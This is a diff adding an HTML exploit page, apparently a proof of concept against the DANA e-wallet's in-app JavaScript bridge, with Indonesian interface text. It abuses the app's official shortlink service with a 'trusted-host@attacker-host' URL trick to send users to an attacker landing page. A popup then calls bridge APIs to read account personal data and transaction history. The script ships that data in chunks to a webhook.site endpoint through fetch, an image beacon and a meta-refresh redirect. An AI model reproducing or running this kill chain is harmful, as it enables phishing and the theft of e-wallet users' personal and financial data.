@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DANA H5 Bridge Test v15</title>
+<style>
+  body{font-family:monospace;background:#111;color:#0f0;padding:12px;font-size:12px;margin:0;padding-top:24px}
+  h3{color:#ff0;margin:14px 0 4px;font-size:13px}
+  .ok{color:#0f0}.err{color:#f55}.pending{color:#888}
+  pre{white-space:pre-wrap;word-break:break-all;background:#000;padding:8px;border:1px solid #333;margin:4px 0;max-height:220px;overflow:auto}
+  button{background:#050;color:#0f0;border:1px solid #0f0;padding:14px;margin:8px 0;font-size:15px;width:100%;font-weight:bold}
+  button.kill{background:#500;color:#f88;border-color:#f88;font-size:16px}
+  button.mini{width:auto;padding:6px 10px;font-size:11px;background:#220;color:#ff0;border:1px solid #660;font-weight:normal}
+  button:disabled{background:#222;color:#666;border-color:#444}
+  #status{position:fixed;top:0;left:0;right:0;background:#330;color:#ff0;padding:5px;font-size:11px;z-index:9}
+  .note{color:#0ff;margin:4px 0}
+  .warn{color:#f80;margin:4px 0}
+  input{width:96%;background:#000;color:#0ff;border:1px solid #660;padding:8px;font-size:12px;margin:2px 0 8px 0;font-family:monospace}
+</style>
+</head>
+<body>
+<div id="status">v15 boot...</div>
+<h3 style="color:#0ff">v15 - KILL-CHAIN FINAL: shortlink resmi &#8594; landing attacker &#8594; bridge &#8594; PII</h3>
+<p class="warn">DISCONNECT HTTP Toolkit dulu, baru tap RUN. Popup kebuka sendiri di tengah run - jangan ditutup, dia akan pindah halaman SENDIRI setelah ~20 dtk (itu normal, bagian dari test).</p>
+
+<h3>[0] env</h3><pre id="p-0" class="pending">pending</pre>
+
+<p class="note">INPUT 1 - partnerId (default terisi, boleh diubah):</p>
+<input id="inp-pids" value="2166020242494729">
+<p class="note">INPUT 2 (opsional) - userId akun DANA kedua MILIKMU:</p>
+<input id="inp-uid2" placeholder="216610000xxxxxxxxxx">
+
+<button id="btn2" onclick="runPhase2()">&#9654; RUN PHASE 2 (Toolkit OFF dulu)</button>
+
+<h3>[1] netcheck</h3><pre id="p-1" class="pending">pending</pre>
+<h3>[2] mint varian CASE (M.DANA.ID@httpbin)</h3><pre id="p-2" class="pending">pending</pre>
+<h3>[3] mint varian link.dana.id@httpbin (host lain di whitelist?)</h3><pre id="p-3" class="pending">pending</pre>
+<h3>[4] mint KILL-CHAIN: m.dana.id@github.io/landing-v15</h3><pre id="p-4" class="pending">pending</pre><button class="mini" onclick="copyBlock('p-4')">copy</button>
+<h3>[5] POPUP blob - verdict multi-kanal (JS + tanpa-JS beacon)</h3><pre id="p-5" class="pending">pending</pre><button class="mini" onclick="copyBlock('p-5')">copy</button>
+<h3>[6] masking x pids</h3><pre id="p-6" class="pending">pending</pre>
+<h3>[7] trx family [uid2]</h3><pre id="p-7" class="pending">pending</pre>
+
+<button onclick="copyAll()">COPY ALL RESULTS (compact)</button>
+<button class="kill" onclick="openKillChain()">&#9889; [K] KILL-CHAIN: BUKA SHORTLINK RESMI &#8594; LANDING ATTACKER (halaman ini akan pindah - ITU POINNYA. Baca verdict besar di halaman yang muncul, hasilnya terkirim otomatis)</button>
+<button class="mini" onclick="exfilManual()" style="width:100%;padding:10px">[17] KIRIM ULANG HASIL KE KANAL LUAR</button>
+<button class="mini" onclick="openPopupAgain()" style="width:100%;padding:10px">[18] BUKA POPUP LAGI (baca tulisan besar BRIDGE: ADA/TIDAK)</button>
+<button class="mini" onclick="openAtShortlink()" style="width:100%;padding:10px">[19] BUKA SHORTLINK @-TRICK httpbin hasil [2]/[3] (kalau sukses mint)</button>
+
+<script>
+(function(){
+  var RESULTS = {};
+  var LOG = [];
+  var running = false;
+  var attempt = 0;
+  var OP_MASKING = 'id.dana.minitunnel.user.info.masking';
+  var PAGES = 'https://rfypych.github.io/poc';
+  var WH = 'https://webhook.site/ae24b403-f298-4923-8e42-5cb1ba6cbd50';
+  var lastShortChain = null;
+  var lastShortAt = null;
+  var blobUrl = null;
+
+  function compact(o){
+    try { return typeof o === 'string' ? o : JSON.stringify(o); } catch(e) { return String(o); }
+  }
+  function set(id, obj, cls){
+    var el = document.getElementById(id);
+    el.className = cls || 'ok';
+    var txt;
+    try { txt = (typeof obj === 'string') ? obj : JSON.stringify(obj, null, 1); } catch(e) { txt = String(obj); }
+    if (txt && txt.length > 1800) txt = txt.slice(0,1800) + '...TRUNC';
+    el.textContent = txt;
+    RESULTS[id] = obj;
+  }
+  var statusEl = document.getElementById('status');
+  function status(t){ statusEl.textContent = t; }
+
+  function bridgeReady(cb){
+    if (window.AlipayJSBridge) return cb();
+    var fired = false;
+    var go = function(){ if (!fired){ fired = true; cb(); } };
+    document.addEventListener('AlipayJSBridgeReady', go, false);
+    setTimeout(go, 5000);
+  }
+  function call(api, param, timeoutMs){
+    return new Promise(function(resolve){
+      var done = false;
+      var t = setTimeout(function(){ if(!done){ done = true; resolve({__timeout:true, waitedMs:timeoutMs||15000}); } }, timeoutMs || 15000);
+      try {
+        window.AlipayJSBridge.call(api, param || {}, function(r){
+          if (!done) { done = true; clearTimeout(t); resolve(r); }
+        });
+      } catch(e) {
+        if (!done) { done = true; clearTimeout(t); resolve({__exception:String(e)}); }
+      }
+    });
+  }
+  function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
+  function getPids(){
+    var raw = (document.getElementById('inp-pids').value || '').trim();
+    if (!raw) return [];
+    return raw.split(/[\s,;]+/).filter(Boolean).slice(0,3);
+  }
+  function getUid2(){
+    return (document.getElementById('inp-uid2').value || '').trim();
+  }
+  function whPing(params){
+    try {
+      var q = [];
+      for (var k in params) q.push(k + '=' + encodeURIComponent(String(params[k]).slice(0,380)));
+      return fetch(WH + '?' + q.join('&'), {mode:'no-cors', cache:'no-store'}).catch(function(e){});
+    } catch(e){ return Promise.resolve(); }
+  }
+  function popupHtml(){
+    var whNav = WH + '?src=v15popupNav&note=meta-refresh-tanpa-js';
+    var whImg = WH + '?src=v15popupImg&note=img-beacon-tanpa-js';
+    var h = '<!DOCTYPE html><html><head><meta charset="utf-8">'
+      + '<meta name="viewport" content="width=device-width,initial-scale=1">'
+      + '<meta http-equiv="refresh" content="22;url=' + whNav + '">'
+      + '<title>v15 popup</title>'
+      + '<style>body{font-family:monospace;background:#111;color:#0f0;padding:12px;font-size:13px}#v{font-size:24px;font-weight:bold;text-align:center;padding:18px 8px;border:3px solid #888;margin:10px 0;word-break:break-word}.yes{color:#0f0;border-color:#0f0}.no{color:#f55;border-color:#f55}.wait{color:#ff0;border-color:#ff0}.sub{font-size:15px;text-align:center;color:#0ff;margin:4px 0;font-weight:bold}pre{white-space:pre-wrap;word-break:break-all;background:#000;padding:8px;border:1px solid #333;margin:4px 0;max-height:200px;overflow:auto}button{width:100%;padding:16px;font-size:16px;background:#050;color:#0f0;border:2px solid #0f0;font-weight:bold;margin:10px 0}.note{color:#0ff;margin:6px 0}</style>'
+      + '</head><body>'
+      + '<h3 style="color:#ff0">V15 POPUP PROBE (blob top-level)</h3>'
+      + '<p class="note">Halaman ini pindah sendiri setelah ~22 dtk (normal - mengirim hasil). Baca tulisan besarnya dulu.</p>'
+      + '<img src="' + whImg + '" style="display:none" width="1" height="1">'
+      + '<div id="v" class="wait">CEK BRIDGE...</div>'
+      + '<div class="sub" id="s1"></div><div class="sub" id="s2"></div>'
+      + '<pre id="env">checking...</pre><pre id="pii">pending</pre><pre id="trx">pending</pre>'
+      + '<button id="cbtn">COPY HASIL POPUP</button>'
+      + '<script>(function(){'
+      + 'var R={};var WH="' + WH + '";'
+      + 'window.__v15res="RES15-OK-"+(location.href||"").slice(0,40);'
+      + 'function cp(o){try{return typeof o==="string"?o:JSON.stringify(o)}catch(e){return String(o)}}'
+      + 'function set(i,o){try{document.getElementById(i).textContent=typeof o==="string"?o:JSON.stringify(o,null,1)}catch(e){}R[i]=o}'
+      + 'function wh(p){try{var q=[];for(var k in p)q.push(k+"="+encodeURIComponent(String(p[k]).slice(0,380)));fetch(WH+"?"+q.join("&"),{mode:"no-cors",cache:"no-store"}).catch(function(e){})}catch(e){}}'
+      + 'window.addEventListener("message",function(e){try{if(e&&e.data&&e.data.__v15ping&&e.source){e.source.postMessage({__v15popup:true,stage:"pong",data:{hasBridge:!!window.AlipayJSBridge,marker:window.__v15res,piiBytes:R.pii?cp(R.pii).length:0,piiHead:R.pii?cp(R.pii).slice(0,120):null,trxBytes:R.trx?cp(R.trx).length:0}},"*")}}catch(err){}},false);'
+      + 'document.getElementById("cbtn").onclick=function(){var ta=document.createElement("textarea");ta.value="v15popup @ "+location.href+"\\nenv: "+cp(R.env||null)+"\\npii: "+cp(R.pii||null)+"\\ntrx: "+cp(R.trx||null);document.body.appendChild(ta);ta.select();try{document.execCommand("copy");alert("copied - paste balik")}catch(e){alert("copy failed")}document.body.removeChild(ta)};'
+      + 'function go(){var hasB=!!window.AlipayJSBridge;var sp={};try{sp=window.AlipayJSBridge.startupParams||{}}catch(e){}'
+      + 'var org="?";try{org=location.origin}catch(e){}'
+      + 'var env={hasBridge:hasB,appId:sp.appId,startScene:sp.startScene||sp.scene,href:(location.href||"").slice(0,90),origin:org,ts:new Date().toISOString()};'
+      + 'set("env",env);wh({src:"v15popupJs",stage:"boot",d:cp(env)});'
+      + 'try{if(window.opener)window.opener.postMessage({__v15popup:true,stage:"boot",data:env},"*")}catch(e){}'
+      + 'if(hasB){var v=document.getElementById("v");v.textContent="BRIDGE: ADA - WEB-SHELL AKTIF";v.className="yes";'
+      + 'var got=false;'
+      + 'try{window.AlipayJSBridge.call("getUserInfoData",{event:"getUserInformation",info:{queryBy:"all"}},function(r){got=true;R.pii=r;set("pii",r);document.getElementById("s1").textContent="DATA AKUN: TERBACA ("+cp(r).length+" byte)";wh({src:"v15popupJs",stage:"pii",piiBytes:cp(r).length,piiHead:cp(r).slice(0,380)});'
+      + 'try{window.AlipayJSBridge.call("getTransactionHistoryList",{event:"getInitList",pageNum:1,forceCache:false},function(t){R.trx=t;set("trx",t);document.getElementById("s2").textContent="DATA TRANSAKSI: TERBACA ("+cp(t).length+" byte)";wh({src:"v15popupJs",stage:"final",piiBytes:cp(r).length,trxBytes:cp(t).length,trxHead:cp(t).slice(0,200)});'
+      + 'try{location.replace(WH+"?src=v15popupJsNav&verdict=BRIDGE-YES&pii="+cp(r).length+"&trx="+cp(t).length)}catch(e3){}})}catch(e2){R.trx={__exception:String(e2)};set("trx",R.trx);wh({src:"v15popupJs",stage:"final",piiBytes:cp(r).length,trxErr:String(e2).slice(0,80)})}})}'
+      + 'catch(e){got=true;R.pii={__exception:String(e)};set("pii",R.pii);wh({src:"v15popupJs",stage:"pii",err:String(e).slice(0,120)})}'
+      + 'setTimeout(function(){if(!got){R.pii={timeoutNoCallback:10000};set("pii",R.pii);document.getElementById("s1").textContent="DATA AKUN: timeout";wh({src:"v15popupJs",stage:"pii",timeout:true})}},10000);'
+      + '}else{var v2=document.getElementById("v");v2.textContent="BRIDGE: TIDAK ADA";v2.className="no";set("pii",{noBridge:true});set("trx",{noBridge:true});wh({src:"v15popupJs",stage:"final",hasBridge:false});'
+      + 'setTimeout(function(){try{location.replace(WH+"?src=v15popupJsNav&verdict=BRIDGE-NO")}catch(e){}},18000);}}'
+      + 'if(window.AlipayJSBridge)return go();document.addEventListener("AlipayJSBridgeReady",go,false);setTimeout(go,5000);})();'
+      + '<\/script></body></html>';
+    return h;
+  }
+  function blobOf(){
+    if (blobUrl) return blobUrl;
+    try { blobUrl = URL.createObjectURL(new Blob([popupHtml()], {type:'text/html'})); } catch(e){ return null; }
+    return blobUrl;
+  }
+
+  window.copyBlock = function(id){
+    var ta = document.createElement('textarea');
+    ta.value = id + ': ' + compact(RESULTS[id]);
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); status('copied ' + id); } catch(e) { status('copy failed'); }
+    document.body.removeChild(ta);
+  };
+  function buildReport(){
+    var lines = [];
+    lines.push('v15 @ ' + location.href.slice(0,110));
+    lines.push('log: ' + compact(LOG));
+    lines.push('inputs: ' + compact({pids:getPids(), uid2:getUid2()}));
+    for (var k = 1; k <= 7; k++) {
+      var id = 'p-' + k;
+      if (RESULTS[id] !== undefined) {
+        var s = compact(RESULTS[id]);
+        if (s.length > 900) s = s.slice(0,900) + '...CUT';
+        lines.push(id + ': ' + s);
+      }
+    }
+    return lines.join('\n');
+  }
+  window.copyAll = function(){
+    var ta = document.createElement('textarea');
+    ta.value = buildReport();
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); status('copied - paste it back'); } catch(e) { status('copy failed - screenshot'); }
+    document.body.removeChild(ta);
+  };
+  async function exfilReport(tag){
+    var txt = (tag ? tag + '\n' : '') + buildReport();
+    var n = Math.ceil(txt.length / 380);
+    if (n > 12) n = 12;
+    var sent = 0;
+    for (var c = 0; c < n; c++){
+      await whPing({src:'v15main', i:c, n:n, d:txt.slice(c*380, (c+1)*380)});
+      sent++;
+      await sleep(300);
+    }
+    return {chunksSent:sent, totalLen:txt.length};
+  }
+  window.exfilManual = async function(){
+    status('kirim ke kanal luar...');
+    var r = await exfilReport('manual');
+    status('terkirim ' + r.chunksSent + ' chunk');
+  };
+
+  function netcheck(){
+    var t0 = Date.now();
+    var rel = fetch('ping.txt?cb=' + Date.now(), {cache:'no-store'})
+      .then(function(r){ return {ok:true, http:r.status, ms:Date.now()-t0}; })
+      .catch(function(e){ return {ok:false, err:String(e).slice(0,60), ms:Date.now()-t0}; });
+    var abs = fetch(PAGES + '/ping.txt?cb=' + Date.now(), {mode:'no-cors', cache:'no-store'})
+      .then(function(){ return {noCors:true, ok:true}; })
+      .catch(function(e){ return {noCors:true, ok:false, err:String(e).slice(0,60)}; });
+    return Promise.all([rel, abs]).then(function(a){ return {relative:a[0], absoluteNoCors:a[1]}; });
+  }
+
+  window.openKillChain = function(){
+    if (!lastShortChain) { alert('[4] belum sukses mint shortlink kill-chain'); return; }
+    location.href = lastShortChain;
+  };
+  window.openPopupAgain = function(){
+    var u = blobOf();
+    if (!u) { alert('popup belum siap - jalankan phase 2 dulu'); return; }
+    var w = null;
+    try { w = window.open(u, '_blank'); } catch(e){}
+    status(w ? 'popup dibuka - baca tulisan besarnya' : 'popup gagal dibuka');
+  };
+  window.openAtShortlink = function(){
+    if (!lastShortAt) { alert('[2]/[3] belum sukses mint shortlink @-trick'); return; }
+    location.href = lastShortAt;
+  };
+
+  async function popupCapture(){
+    if (!blobOf()) return {skipped:'no blob'};
+    var msgs = [];
+    var gotFinal = false;
+    var listener = function(e){
+      try {
+        if (e && e.data && e.data.__v15popup){
+          msgs.push({origin:String(e.origin), stage:e.data.stage, head:compact(e.data.data).slice(0,300)});
+          if (e.data.stage === 'pong' && e.data.data && e.data.data.hasBridge !== undefined) gotFinal = true;
+        }
+      } catch(err){}
+    };
+    window.addEventListener('message', listener, false);
+    var w = null;
+    try { w = window.open(blobOf(), '_blank'); } catch(e){}
+    var t0 = Date.now();
+    var pings = 0;
+    while ((Date.now() - t0) < 20000 && !gotFinal){
+      try { if (w) w.postMessage({__v15ping:true, n:++pings}, '*'); } catch(e){}
+      await sleep(800);
+    }
+    window.removeEventListener('message', listener, false);
+    var out = {opened:!!w, pingSent:pings, waitedMs:Date.now()-t0, msgs:(msgs.length ? msgs : null)};
+    var derived = null;
+    for (var i = 0; i < msgs.length; i++){
+      var h = msgs[i].head || '';
+      if (h.indexOf('"hasBridge":true') !== -1) derived = 'BRIDGE-YES';
+      if (h.indexOf('"hasBridge":false') !== -1) derived = 'BRIDGE-NO';
+    }
+    out.derived = derived;
+    out.note = 'popup punya 4 kanal lapor: ping-balik (sini), opener-post, fetch OOB, meta-refresh navigate. Verdict final dicek operator di webhook (src v15popup*). Popup pindah halaman sendiri ~22 dtk = normal.';
+    return out;
+  }
+
+  window.runPhase2 = async function(){
+    if (running) return;
+    if (!window.AlipayJSBridge) { status('no bridge - cannot run phase 2'); return; }
+    running = true; attempt++;
+    var btn = document.getElementById('btn2');
+    btn.disabled = true;
+    var pids = getPids();
+    var uid2 = getUid2();
+    LOG.push({attempt:attempt, startedAt:new Date().toISOString(), pids:pids, uid2:uid2?'set':'empty'});
+    try {
+      status('P2/' + attempt + ' [1] netcheck');
+      set('p-1', await netcheck());
+
+      status('P2/' + attempt + ' [2] mint varian CASE');
+      var s2 = await call('createShortLink', {url:'https://M.DANA.ID@httpbin.org/anything?src=v15case'}, 20000);
+      set('p-2', s2);
+      await sleep(3000);
+
+      status('P2/' + attempt + ' [3] mint varian link.dana.id@');
+      var s3 = await call('createShortLink', {url:'https://link.dana.id@httpbin.org/anything?src=v15linkhost'}, 20000);
+      set('p-3', s3);
+      if (s3 && s3.shortUrl) lastShortAt = s3.shortUrl;
+      await sleep(3000);
+
+      status('P2/' + attempt + ' [4] mint KILL-CHAIN @github.io landing');
+      var s4 = await call('createShortLink', {url:'https://m.dana.id@rfypych.github.io/poc/landing-v15.html?src=v15chain'}, 20000);
+      set('p-4', s4);
+      if (s4 && s4.shortUrl) lastShortChain = s4.shortUrl;
+      await sleep(3000);
+
+      status('P2/' + attempt + ' [5] POPUP multi-kanal - JANGAN tutup popup');
+      set('p-5', await popupCapture());
+      await sleep(800);
+
+      status('P2/' + attempt + ' [6] masking x pids');
+      if (pids.length){
+        var mres = {};
+        for (var i = 0; i < pids.length; i++){
+          mres[pids[i]] = await call('requestApi', {operationType:OP_MASKING, payload:{partnerId:pids[i]}}, 20000);
+          await sleep(600);
+        }
+        set('p-6', mres);
+      } else {
+        set('p-6', 'skipped - no partnerId input', 'err');
+      }
+
+      status('P2/' + attempt + ' [7] trx family [uid2]');
+      if (uid2){
+        set('p-7', await call('getTransactionHistoryList', {event:'getInitList', pageNum:1, forceCache:false, familyAccountMemberIds:[uid2]}, 25000));
+      } else {
+        set('p-7', 'skipped - no second-account userId input', 'err');
+      }
+
+      LOG.push({attempt:attempt, finishedAt:new Date().toISOString(), note:'phase2 complete', lastShortChain:lastShortChain, lastShortAt:lastShortAt});
+      status('DONE P2 attempt ' + attempt + ' - kirim OOB, lalu COPY ALL + [K]');
+      var ex = await exfilReport('auto-phase2');
+      LOG.push({oob:{chunksSent:ex.chunksSent}});
+      status('DONE - OOB terkirim (' + ex.chunksSent + ' chunk). COPY ALL, lalu tap tombol MERAH [K]');
+    } catch(e) {
+      status('phase2 error: ' + String(e).slice(0,60));
+    }
+    running = false;
+    btn.disabled = false;
+    btn.innerHTML = '&#8635; RE-RUN PHASE 2';
+  };
+
+  bridgeReady(function(){
+    if (!window.AlipayJSBridge){
+      set('p-0', {noBridge:true, href:location.href, ua:navigator.userAgent.slice(0,80)}, 'err');
+      status('NO BRIDGE (browser?) - open inside DANA container');
+      return;
+    }
+    var sp = {};
+    try { sp = window.AlipayJSBridge.startupParams || {}; } catch(e){}
+    set('p-0', {hasBridge:true, appId:sp.appId, startScene:sp.startScene||sp.scene, href:location.href.slice(0,100)});
+    LOG.push({phase1Done:new Date().toISOString()});
+    whPing({src:'v15boot', href:location.href.slice(0,100), appId:sp.appId});
+    status('PHASE 1 DONE - disconnect toolkit, RUN PHASE 2');
+  });
+})();
+</script>
+</body>
+</html>
